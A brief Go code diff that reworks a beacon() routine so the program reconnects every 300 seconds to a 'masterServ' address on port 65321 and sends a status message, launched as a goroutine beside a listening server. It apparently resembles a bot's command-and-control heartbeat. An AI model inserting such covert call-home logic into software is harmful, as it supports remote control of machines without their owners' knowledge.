@@ -21,11 +21,13 @@ const (
 )
 
 func beacon() {
-	conn, err := net.Dial("tcp", (masterServ + ":65321"))
-	errorHandler(err)
+
 	for true {
+		conn, err := net.Dial("tcp", (masterServ + ":65321"))
+		errorHandler(err)
 		time.Sleep(300 * time.Second)
 		conn.Write([]byte(writeData(true, "NULL")))
+		conn.Close()
 	}
 
 }
@@ -141,7 +143,7 @@ func main() {
 		fmt.Println("Error listening:", err.Error())
 		os.Exit(1)
 	}
-
+	go beacon()
 	defer server.Close()
 
 	for {
